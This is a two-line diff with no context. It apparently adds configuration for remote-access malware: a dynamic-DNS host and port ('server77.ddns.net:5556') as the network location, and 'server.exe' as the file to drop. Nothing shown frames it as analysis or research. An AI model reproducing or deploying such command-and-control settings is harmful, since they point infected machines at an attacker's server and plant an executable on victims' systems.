@@ -1,0 +1,2 @@
+NetLoc server77.ddns.net:5556
+Drop server.exe
